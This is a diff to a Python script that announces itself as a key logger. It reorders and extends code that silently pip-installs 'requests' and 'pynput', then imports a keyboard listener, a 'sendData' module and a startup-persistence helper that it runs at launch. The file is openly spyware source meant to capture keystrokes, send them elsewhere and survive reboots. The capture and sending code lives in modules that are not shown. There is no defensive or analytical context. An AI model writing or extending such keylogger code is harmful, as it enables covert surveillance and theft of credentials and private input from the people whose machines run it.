@@ -1,3 +1,16 @@
+import subprocess
+check_elevate = subprocess.run(
+    ["pip", "show", "requests"], shell=True, capture_output=True
+).returncode
+if check_elevate == 1:
+    print("INSTALLING REQUESTS...")
+    subprocess.run(["pip", "install", "requests"], shell=True)
+check_elevate = subprocess.run(
+    ["pip", "show", "pynput"], shell=True, capture_output=True
+).returncode
+if check_elevate == 1:
+    print("INSTALLING PYNPUT...")
+    subprocess.run(["pip", "install", "pynput"], shell=True)
 from pynput.keyboard import Key, Listener
 import threading
 from time import sleep
@@ -6,14 +19,9 @@ import recordJSONManager as rjM
 import settingsManager as sM
 import sendData as sD
 from enableRunAtStartUp import createBat
-import subprocess
 
-check_elevate = subprocess.run(
-    ["pip", "show", "requests"], shell=True, capture_output=True
-).returncode
-if check_elevate == 1:
-    print("INSTALLING REQUESTS...")
-    subprocess.run(["pip", "install", "requests"], shell=True)
+
+
 # Start screen
 print("Starting Key logger ...")
 createBat()
